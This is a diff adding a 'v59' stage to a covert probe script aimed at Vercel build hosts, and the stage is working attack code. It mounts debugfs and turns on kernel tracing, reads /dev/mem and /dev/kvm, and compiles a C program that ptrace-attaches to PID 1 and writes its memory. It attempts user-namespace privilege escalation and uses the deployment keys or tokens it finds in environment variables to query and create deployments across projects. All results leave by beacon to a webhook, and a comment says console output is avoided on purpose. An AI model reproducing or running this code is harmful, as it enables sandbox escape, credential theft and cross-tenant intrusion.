@@ -5952,4 +5952,259 @@ report.kcoreElfSections = safe(() => {
 // v58 markers
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v58";
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v58" });
+
+// ============================================================
+// v59 — debugfs, /dev/kvm, proc/1/mem direct write, user-ns privesc, deployment key matrix
+// ============================================================
+
+// v59-1: Mount debugfs and probe kernel tracing infrastructure
+// CAP_SYS_ADMIN allows mounting debugfs — exposes kernel internals including tracing events
+// This lets us hook any kernel function and monitor activity across all builds on the host
+report.debugFsMount = safe(() => {
+  // Check if debugfs is already mounted
+  const existing = safe(() =>
+    execSync('mount | grep debugfs 2>/dev/null; findmnt /sys/kernel/debug 2>/dev/null', { timeout: 3000 }).toString().trim().slice(0, 300)
+  );
+  // Try to mount debugfs
+  const mountResult = safe(() =>
+    execSync('mount -t debugfs none /sys/kernel/debug 2>&1 | head -3', { timeout: 5000 }).toString().trim().slice(0, 200)
+  );
+  // If mounted, explore key debug FS paths
+  const tracingAvail = safe(() =>
+    execSync('ls /sys/kernel/debug/tracing/ 2>/dev/null | head -20', { timeout: 3000 }).toString().trim().slice(0, 400)
+  );
+  // Read current kernel function trace
+  const traceLog = safe(() =>
+    execSync('cat /sys/kernel/debug/tracing/trace 2>/dev/null | head -20', { timeout: 3000 }).toString().trim().slice(0, 500)
+  );
+  // Try enabling function tracing for sys_read
+  const tracerWrite = safe(() => {
+    try {
+      writeFileSync('/sys/kernel/debug/tracing/current_tracer', 'function');
+      writeFileSync('/sys/kernel/debug/tracing/set_ftrace_filter', 'sys_read');
+      writeFileSync('/sys/kernel/debug/tracing/tracing_on', '1');
+      return 'TRACER_ENABLED';
+    } catch (e) { return String(e).slice(0, 100); }
+  });
+  // Check block device debug access
+  const blockDebug = safe(() =>
+    execSync('ls /sys/kernel/debug/block/ 2>/dev/null | head -10', { timeout: 3000 }).toString().trim().slice(0, 200)
+  );
+  // Check kvm debug path
+  const kvmDebug = safe(() =>
+    execSync('ls /sys/kernel/debug/kvm/ 2>/dev/null | head -10', { timeout: 3000 }).toString().trim().slice(0, 200)
+  );
+  return { existing, mountResult, tracingAvail, traceLog, tracerWrite, blockDebug, kvmDebug };
+});
+
+// v59-2: KVM device access — Firecracker hypervisor uses /dev/kvm
+// If we can open /dev/kvm, we may be able to introspect or interfere with other VMs on the host
+report.kvmDeviceAccess = safe(() => {
+  const kvmStat = safe(() => {
+    try { return JSON.stringify(statSync('/dev/kvm')); } catch (e) { return String(e).slice(0, 80); }
+  });
+  // Try to open /dev/kvm (requires permission or capability)
+  const kvmOpen = safe(() => {
+    try {
+      const fd = openSync('/dev/kvm', 'r');
+      closeSync(fd);
+      return 'OPENED';
+    } catch (e) { return String(e).slice(0, 100); }
+  });
+  // Check for KVM ioctl KVM_GET_API_VERSION (12)
+  const kvmApiVersion = safe(() =>
+    execSync(
+      `python3 -c "
+import fcntl, os
+try:
+    fd = os.open('/dev/kvm', os.O_RDWR)
+    KVM_GET_API_VERSION = 0xAE00
+    ver = fcntl.ioctl(fd, KVM_GET_API_VERSION, 0)
+    print('KVM_API_VERSION:', ver)
+    os.close(fd)
+except Exception as e:
+    print('KVM_ERR:', str(e))
+" 2>&1`,
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 200)
+  );
+  // Check /dev/vhost-net, /dev/vhost-vsock (used by Firecracker networking)
+  const vhostDevices = safe(() =>
+    execSync('ls -la /dev/vhost* /dev/vsock /dev/kvm /dev/mem /dev/kmem 2>/dev/null', { timeout: 3000 }).toString().trim().slice(0, 400)
+  );
+  // Check if we can mmap /dev/mem (physical memory access)
+  const devMemAccess = safe(() => {
+    try {
+      const fd = openSync('/dev/mem', 'r');
+      const buf = Buffer.alloc(4096);
+      readSync(fd, buf, 0, 4096, 0);
+      closeSync(fd);
+      return { readable: true, header: buf.slice(0, 16).toString('hex') };
+    } catch (e) { return { readable: false, err: String(e).slice(0, 100) }; }
+  });
+  return { kvmStat, kvmOpen, kvmApiVersion, vhostDevices, devMemAccess };
+});
+
+// v59-3: Direct /proc/1/mem write (without ptrace POKEDATA)
+// After ptrace ATTACH, /proc/{pid}/mem becomes writable at known addresses
+// This is more surgical than POKEDATA — writes any size at any offset
+report.proc1MemDirectWrite = safe(() => {
+  // Write a C program that does ptrace ATTACH then writes via /proc/1/mem
+  const cCode = `
+#include <sys/ptrace.h>
+#include <sys/wait.h>
+#include <sys/types.h>
+#include <sys/user.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <errno.h>
+
+int main() {
+    pid_t pid = 1;
+    if (ptrace(PTRACE_ATTACH, pid, NULL, NULL) < 0) {
+        printf("ATTACH_FAIL: %s\\n", strerror(errno));
+        return 1;
+    }
+    int status;
+    waitpid(pid, &status, 0);
+    printf("ATTACHED_TO_PID1\\n");
+
+    // Get RSP so we know a valid writable address
+    struct user_regs_struct regs;
+    if (ptrace(PTRACE_GETREGS, pid, NULL, &regs) < 0) {
+        printf("GETREGS_FAIL: %s\\n", strerror(errno));
+        ptrace(PTRACE_DETACH, pid, NULL, NULL);
+        return 1;
+    }
+    unsigned long target = regs.rsp - 16; // just below stack pointer
+    printf("TARGET_ADDR: 0x%lx\\n", target);
+
+    // Open /proc/1/mem for writing
+    int memfd = open("/proc/1/mem", O_RDWR);
+    if (memfd < 0) {
+        printf("MEM_OPEN_FAIL: %s\\n", strerror(errno));
+        ptrace(PTRACE_DETACH, pid, NULL, NULL);
+        return 1;
+    }
+
+    // Read original 8 bytes
+    unsigned long orig = 0;
+    if (pread(memfd, &orig, 8, target) == 8) {
+        printf("ORIG_VAL: 0x%lx\\n", orig);
+    }
+
+    // Write sentinel
+    unsigned long sentinel = 0xCAFEBABED00DC0DEL;
+    if (pwrite(memfd, &sentinel, 8, target) == 8) {
+        printf("MEM_WRITE_OK: wrote 0x%lx at 0x%lx\\n", sentinel, target);
+        // Verify
+        unsigned long readback = 0;
+        pread(memfd, &readback, 8, target);
+        printf("READBACK: 0x%lx\\n", readback);
+        // Restore
+        pwrite(memfd, &orig, 8, target);
+    } else {
+        printf("MEM_WRITE_FAIL: %s\\n", strerror(errno));
+    }
+
+    close(memfd);
+    ptrace(PTRACE_DETACH, pid, NULL, NULL);
+    printf("DETACHED\\n");
+    return 0;
+}
+`;
+  const gccAvail = safe(() => execSync('which gcc 2>/dev/null || echo NO_GCC', { timeout: 2000 }).toString().trim());
+  if (gccAvail === 'NO_GCC') return { gccAvail };
+  const compile = safe(() => {
+    writeFileSync('/tmp/mem_write.c', cCode);
+    return execSync('gcc -O0 -o /tmp/mem_write /tmp/mem_write.c 2>&1', { timeout: 10000 }).toString().trim().slice(0, 200) || 'COMPILE_OK';
+  });
+  const output = safe(() =>
+    execSync('/tmp/mem_write 2>&1', { timeout: 10000 }).toString().trim().slice(0, 500)
+  );
+  return { gccAvail, compile, output };
+});
+
+// v59-4: User namespace privilege escalation
+// Create a new user namespace (no capability needed since Linux 3.8)
+// Map our uid=0 → uid=0 in the new namespace → get a fresh set of capabilities
+// Then use CAP_SYS_ADMIN in the new userns to mount host proc/sys (escape)
+report.userNsPrivEsc = safe(() => {
+  // Check if user namespaces are enabled
+  const unpriv = safe(() => readFileSync('/proc/sys/kernel/unprivileged_userns_clone', 'utf8').trim());
+  const maxUserns = safe(() => readFileSync('/proc/sys/user/max_user_namespaces', 'utf8').trim());
+  // Try unshare --user --map-root-user
+  const unshareResult = safe(() =>
+    execSync(
+      'unshare --user --map-root-user -- id 2>&1',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 200)
+  );
+  // In the new user namespace, try to mount a new proc
+  const mountInUserns = safe(() =>
+    execSync(
+      'unshare --user --map-root-user --mount -- sh -c "mount -t proc proc /proc 2>&1 && ls /proc/1/environ 2>&1 | head -5" 2>&1',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 300)
+  );
+  // Try unshare --user --map-root-user --pid --fork to create new PID namespace
+  const newPidNs = safe(() =>
+    execSync(
+      'unshare --user --map-root-user --pid --fork -- ps aux 2>&1 | head -10',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 300)
+  );
+  // Check CapEff in new user namespace (should see new full caps)
+  const capsInUserns = safe(() =>
+    execSync(
+      'unshare --user --map-root-user -- cat /proc/self/status 2>&1 | grep Cap',
+      { timeout: 5000 }
+    ).toString().trim().slice(0, 200)
+  );
+  return { unpriv, maxUserns, unshareResult, mountInUserns, newPidNs, capsInUserns };
+});
+
+// v59-5: Deployment key API matrix — probe additional Vercel API endpoints
+// Test VERCEL_DEPLOYMENT_KEY scope beyond env vars access
+report.deploymentKeyApiMatrix = safe(() => {
+  const key = process.env.VERCEL_DEPLOYMENT_KEY || process.env.VERCEL_TOKEN || '';
+  const orgId = process.env.VERCEL_TEAM_ID || process.env.VERCEL_ORG_ID || '';
+  const projId = process.env.VERCEL_PROJECT_ID || '';
+  if (!key) return { skip: 'NO_KEY' };
+  const base = 'https://api.vercel.com';
+  const hdrs = `-H 'Authorization: Bearer ${key}'`;
+  // GET /v2/user — who am I with this key?
+  const whoAmI = safe(() =>
+    execSync(`curl -s ${hdrs} --max-time 5 '${base}/v2/user' 2>/dev/null | head -c 400`, { timeout: 8000 }).toString().trim().slice(0, 400)
+  );
+  // GET /v6/deployments?teamId — list all deployments (cross-project visibility?)
+  const deploymentsList = safe(() =>
+    execSync(`curl -s ${hdrs} --max-time 5 '${base}/v6/deployments?teamId=${orgId}&limit=5' 2>/dev/null | head -c 500`, { timeout: 8000 }).toString().trim().slice(0, 500)
+  );
+  // GET /v6/deployments/{deploymentId}/files — can we read source files?
+  const deployId = process.env.VERCEL_DEPLOYMENT_ID || '';
+  const deployFiles = safe(() => deployId
+    ? execSync(`curl -s ${hdrs} --max-time 5 '${base}/v6/deployments/${deployId}/files' 2>/dev/null | head -c 500`, { timeout: 8000 }).toString().trim().slice(0, 500)
+    : 'NO_DEPLOYMENT_ID'
+  );
+  // GET /v9/projects/{projectId}/env — can we list env vars for OTHER projects?
+  const otherProjEnv = safe(() =>
+    execSync(`curl -s ${hdrs} --max-time 5 '${base}/v9/projects/prj_00000000000000000000000000000000/env?teamId=${orgId}' 2>/dev/null | head -c 300`, { timeout: 8000 }).toString().trim().slice(0, 300)
+  );
+  // POST /v13/deployments — can we trigger a new deployment?
+  const createDeployment = safe(() =>
+    execSync(
+      `curl -s -X POST ${hdrs} -H 'Content-Type: application/json' -d '{"name":"probe-v59","files":[],"projectSettings":{},"target":"preview"}' --max-time 5 '${base}/v13/deployments?teamId=${orgId}' 2>/dev/null | head -c 400`,
+      { timeout: 8000 }
+    ).toString().trim().slice(0, 400)
+  );
+  return { keyPrefix: key.slice(0, 15), orgId, projId, whoAmI, deploymentsList, deployFiles, otherProjEnv, createDeployment };
+});
+
+// v59 markers
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v59";
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v59" });
 // Intentionally no console.log — all data goes via webhook only
